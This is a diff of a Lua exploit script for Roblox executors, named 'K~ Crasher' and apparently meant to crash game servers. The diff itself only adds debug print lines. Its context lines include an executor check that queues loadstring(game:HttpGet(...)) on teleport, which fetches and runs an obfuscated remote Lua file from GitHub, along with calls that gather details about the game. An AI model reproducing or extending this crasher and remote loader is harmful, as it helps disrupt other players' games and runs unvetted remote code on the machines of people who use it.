@@ -56,11 +56,12 @@ _G.CrashSettings = {
 if _G.CrashSettings.Enabled ~= true then return end
 if KCLOADED == true then return task.spawn(error, 'K~ Crasher is already loaded! 0x1') end
 getgenv().KCLOADED = true
+
 -- VegaX use only!
 if identifyexecutor() == "VegaX" then
 	queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CrisomoX/makeBoom/main/iodf9s8jiosiuuisodfhuihjdfuaoshsafbiasfasfasfsafas.lua'))()")
 end
-
+print(1)
 -- Services --
 local Players = game:GetService('Players')
 local TeleportService = game:GetService('Players')
@@ -119,6 +120,7 @@ local function RetriveGameDetails()
 		Url = 'https://thumbnails.roblox.com/v1/places/gameicons?placeIds='..game.PlaceId..'&size=50x50&format=Png&isCircular=false',
 		Method = 'GET',
 	}).Body
+	print(2)
 	local GameDetails = Marketplace:GetProductInfo(game.PlaceId)
 	return {
 		TotalPlayers = '**'..(#Players:GetPlayers())..'**',
@@ -198,6 +200,7 @@ local function ForcedStopMessage(message)
 	ForcedStopSent = true
 
 end
+print(5550505005505949850437475857239079530572395)
 local function HandleTeleportRequests()
 	local Ids = {}
 	local TS, HS = game:GetService('TeleportService'), game:GetService('HttpService')
